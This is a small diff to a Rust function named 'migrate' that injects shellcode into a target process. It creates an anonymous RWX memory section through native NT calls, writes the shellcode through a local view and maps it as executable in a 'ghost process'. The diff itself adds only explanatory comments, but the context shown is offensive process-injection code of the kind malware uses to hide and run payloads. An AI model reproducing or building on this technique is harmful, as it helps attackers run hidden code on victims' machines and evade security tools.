@@ -15,6 +15,8 @@ pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usiz
     let section_size: i64 = shellcode.len() as i64;
     let mut section_handle: HANDLE = null_mut();
 
+    // Create anonymous section (no file backing, PAGE_EXECUTE_READWIRTE)
+    // The section itself has RWX capability, but views are mapped with restricted permissions
     let status = nt::nt_create_section(
         &mut section_handle,
         0x000F001F, // SECTION_ALL_ACCESS
@@ -61,6 +63,8 @@ pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usiz
 
     // Unmap local view, cuz done wirting and I do not need it anymore
     nt::nt_unmap_view_of_section(current_process, local_view);
+
+    // Map remote view as RX in the ghost process, this makes the shellcode executable
     let mut remote_shellcode: *mut c_void = null_mut();
     let mut remote_view_size: usize = 0;
 
